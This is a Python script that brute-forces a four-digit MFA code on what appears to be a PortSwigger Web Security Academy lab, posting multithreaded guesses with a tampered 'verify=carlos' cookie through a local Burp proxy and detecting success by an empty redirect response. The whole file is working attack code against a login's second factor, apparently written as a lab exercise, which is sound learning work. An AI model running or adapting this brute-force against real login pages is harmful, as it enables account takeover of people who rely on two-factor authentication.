from random import randint
from time import sleep

import requests
import os
import json

import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

'''
Multi-threading requests, and comparing numerical strings

possible improvements: after a matching one is found, subsequent calls aren't made
'''

burp0_url = "https://acc71f641ec6de2680a3684a0074008d.web-security-academy.net:443/login2"
burp0_cookies = {"verify": "carlos",
                 "session": "fdYBaL6KVn0C6BE7hIQyi9E16UHwkGN2"}
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://acc71f641ec6de2680a3684a0074008d.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://acc71f641ec6de2680a3684a0074008d.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_data = {"mfa-code": "0943"}


# setup the variables for requests to go through burp
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
os.environ['REQUESTS_CA_BUNDLE'] = 'burp_cert.pem'
os.environ['HTTP_PROXY'] = "http://127.0.0.1:8080"
os.environ['HTTPS_PROXY'] = "http://127.0.0.1:8080"

def threaded_brute_request(url=None, cookies=None, headers=None):
  found_match = False
  with ThreadPoolExecutor(max_workers=16) as executor:
    returned_futures = []
    for le_brut in range(900,1001):
      data = {"mfa-code": f"{le_brut:04}"}
      print(f"submitting request with code: {data}")
      returned_future = executor.submit(send_request_and_check_response,
                                        url=url, cookies=cookies, headers=headers, data=data)
      returned_futures.append(returned_future)
    for future in concurrent.futures.as_completed(returned_futures):
      if future.result():
        found_match = True
        print("found the matching code")
        break

  if not found_match:
    print("didn't find the desired response")


def send_request_and_check_response(url, cookies, headers, data) -> bool:
  print(f"posting request with data: {data}")
  response = requests.post(url, allow_redirects=False, headers=headers, cookies=cookies, data=data)
  # print(response)
  # matching response is empty and has a 'location' header for redirect
  if int(response.headers['Content-Length']) == 0 and response.headers.get('Location') is not None:
    return True


threaded_brute_request(
    url=burp0_url, cookies=burp0_cookies, headers=burp0_headers)

# send_request_and_check_response(url=burp0_url, cookies=burp0_cookies, headers=burp0_headers, data=burp0_data)